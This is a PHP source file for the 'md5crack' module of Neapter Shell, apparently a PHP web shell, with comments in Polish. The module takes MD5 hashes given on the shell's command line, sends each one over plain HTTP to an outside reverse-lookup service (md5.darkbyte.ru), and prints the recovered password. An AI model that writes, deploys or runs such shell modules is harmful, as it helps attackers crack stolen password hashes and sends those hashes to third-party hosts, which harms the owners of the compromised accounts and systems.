<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Lamanie hasy md5
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleMd5crack extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'md5crack' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.02 2012-11-10 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Łamanie haszy md5

	Użycie:
		md5crack hashmd5 [hashmd5] [hashmd5]

	Przykład:
		md5crack 098f6bcd4621d373cade4e832627b4f6 b36d331451a61eb2d76860e00c347396
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc === 0 )
		{
			return $this -> getHelp();
		}

		$sOutput = NULL;
		for( $i = 0; $i < $this -> oShell -> iArgc; ++$i )
		{
			if( ! preg_match( '~^[a-zA-Z0-9]{32}\z~', $this -> oShell -> aArgv[ $i ] ) )
			{
				continue ;
			}

			/**
			 * API md5.darkbyte.ru
			 */
			$sData = file_get_contents( 'http://md5.darkbyte.ru/api.php?q=' . $this -> oShell -> aArgv[ $i ] );

			$sOutput .= sprintf( "%s:%s\r\n", $this -> oShell -> aArgv[ $i ], ( $sData ?: 'password-not-found' ) );
		}

		return htmlspecialchars( $sOutput );
	}

}